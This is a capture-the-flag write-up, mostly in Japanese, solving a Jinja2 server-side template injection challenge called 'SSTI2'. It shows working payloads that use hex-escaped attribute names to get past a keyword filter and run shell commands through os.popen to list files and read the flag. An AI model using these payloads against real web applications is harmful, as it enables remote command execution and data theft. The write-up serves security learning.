## SSTI2

### Description  

I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)
I heard templating is a cool and modular way to build web apps! 

要約すると、
なんかすごいwebサイトを作ったようだ
TTLI1のときから、サニタイズについて学び、修正を行ったようだ。

---

早速、webサイトにアクセスする。  
下のようなwebサイトが開く。


![](./TTL2(1).png)

欄に {{2*2}} と入力する。h1タグで 4 と表示された。  
コード実行は可能ということが分かった。

TTLI1の
```
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```
を実行してみる
![](./image.png)

怒られた。TTL1の方法は使えないようだ。
__globals__などの特定の単語がブロックされている。
これを16進エンコードやattrを使って回避する
下の様にして、

```
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')() }}
```
実行すると、下のようなファイルがあることが分かった。
```
__pycache__
app.py
flag
requirements.txt
```
flagファイルをcatする。
```
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')() }}
```

Flagがゲットできた